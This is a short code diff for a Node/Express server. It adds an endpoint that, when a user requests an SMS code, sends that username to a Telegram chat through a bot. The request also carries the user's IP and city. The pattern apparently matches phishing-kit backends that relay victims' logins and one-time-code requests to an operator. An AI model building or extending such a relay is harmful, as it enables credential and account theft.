@@ -135,7 +135,32 @@ app.post('/api/sendMessage2', async (req, res) => {
 });
 
 
+app.post('/api/solicito-codigo', async (req, res) => {
+    const { user, action, ip, city } = req.body;
+    
+    if (!user) {
+        return res.status(400).json({ error: 'Falta el usuario' });
+    }
 
+    const mensaje = `🔔 Solicitó SMS Usuario: ${user} `;
+
+    try {
+        const response = await axios.post(
+            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+            {
+                chat_id: CHAT_ID,
+                text: mensaje,
+                parse_mode: "Markdown"   // opcional, para mejor formato
+            },
+            { httpsAgent: agent }
+        );
+
+        res.status(200).json({ success: true });
+    } catch (error) {
+        console.error('Error enviando notificación de solicitud de código:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
 
 
 const PORT = process.env.PORT || 3000;
